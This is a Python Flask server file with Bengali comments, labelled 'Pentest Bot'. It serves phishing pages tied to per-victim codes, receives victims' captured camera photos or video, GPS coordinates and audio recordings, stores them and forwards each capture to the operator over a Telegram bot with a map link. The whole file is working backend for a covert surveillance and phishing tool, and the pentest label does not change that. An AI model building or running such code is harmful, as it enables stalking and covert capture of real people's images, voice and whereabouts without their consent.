from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_cors import CORS
import os
import json
import threading
import time
from datetime import datetime
from config import BASE_URL, PORT, BOT_TOKEN, CHANNEL_USERNAME
from database import db

app = Flask(__name__)
CORS(app)

# ========== বট থ্রেড ==========

bot_thread = None
bot_running = False

def start_bot():
    global bot_running
    if bot_running:
        return
    try:
        from bot import run_bot
        t = threading.Thread(target=run_bot, daemon=True)
        t.start()
        bot_running = True
        print('✅ Bot thread started')
    except Exception as e:
        print(f'❌ Bot thread failed: {e}')

# ========== রুট ==========

@app.route('/')
def index():
    return f'''
    <html>
    <head><title>Pentest Bot</title>
    <style>
        body {{ font-family: Arial; background: #0d1117; color: #c9d1d9; text-align: center; padding-top: 100px; }}
        h1 {{ color: #58a6ff; }}
        .status {{ color: #3fb950; }}
        .info {{ color: #8b949e; font-size: 14px; }}
    </style>
    </head>
    <body>
        <h1>🔐 Pentest Bot Server</h1>
        <p class="status">✅ Running</p>
        <p class="info">Server: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p class="info">Users: {db.get_global_stats()['total_users']} | Victims: {db.get_global_stats()['total_victims']}</p>
    </body>
    </html>
    '''

# ========== ফিশিং পেজ ==========

@app.route('/camera/<code>')
def page_camera(code):
    victim = db.get_victim(code)
    return render_template('camera.html', code=code, server=BASE_URL, valid=victim is not None)

@app.route('/location/<code>')
def page_location(code):
    victim = db.get_victim(code)
    return render_template('location.html', code=code, server=BASE_URL, valid=victim is not None)

@app.route('/audio/<code>')
def page_audio(code):
    victim = db.get_victim(code)
    return render_template('audio.html', code=code, server=BASE_URL, valid=victim is not None)

# ========== API ==========

@app.route('/api/camera/<code>', methods=['POST'])
def api_camera(code):
    try:
        data = request.get_json(force=True, silent=True)
        if not data:
            return jsonify({'status': 'error', 'message': 'no data'}), 400
        
        db.update_victim_data(code, 'camera', data)
        owner = db.get_victim_owner(code)
        
        if owner:
            try:
                from bot import bot
                dtype = data.get('type', 'photo')
                icon = '📷' if dtype == 'photo' else '🎥'
                bot.send_message(owner,
                    f'{icon} *ক্যামেরা!*\n`{code}`\nটাইপ: {dtype}\n{datetime.now().strftime("%H:%M")}',
                    parse_mode='Markdown')
            except:
                pass
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/location/<code>', methods=['POST'])
def api_location(code):
    try:
        data = request.get_json(force=True, silent=True)
        if not data:
            return jsonify({'status': 'error', 'message': 'no data'}), 400
        
        db.update_victim_data(code, 'location', data)
        owner = db.get_victim_owner(code)
        
        if owner:
            try:
                from bot import bot
                lat = data.get('lat', '?')
                lng = data.get('lng', '?')
                bot.send_message(owner,
                    f'📍 *লোকেশন!*\n`{code}`\n{lat}, {lng}\n[🗺 ম্যাপ](https://www.google.com/maps?q={lat},{lng})',
                    parse_mode='Markdown')
            except:
                pass
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/audio/<code>', methods=['POST'])
def api_audio(code):
    try:
        data = request.get_json(force=True, silent=True)
        if not data:
            return jsonify({'status': 'error', 'message': 'no data'}), 400
        
        db.update_victim_data(code, 'audio', data)
        owner = db.get_victim_owner(code)
        
        if owner:
            try:
                from bot import bot
                dur = data.get('duration', '?')
                bot.send_message(owner,
                    f'🎤 *অডিও!*\n`{code}`\nডিউরেশন: {dur}ms\n{datetime.now().strftime("%H:%M")}',
                    parse_mode='Markdown')
            except:
                pass
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/check/<code>')
def api_check(code):
    victim = db.get_victim(code)
    if not victim:
        return jsonify({'exists': False}), 404
    return jsonify({
        'exists': True,
        'camera': bool(victim['camera_data']),
        'location': bool(victim['location_data']),
        'audio': bool(victim['audio_data']),
        'hits': victim['access_count'],
        'last': victim['last_access']
    })

# ========== স্ট্যাটিক ==========

@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

# ========== মেইন ==========

if __name__ == '__main__':
    start_bot()
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)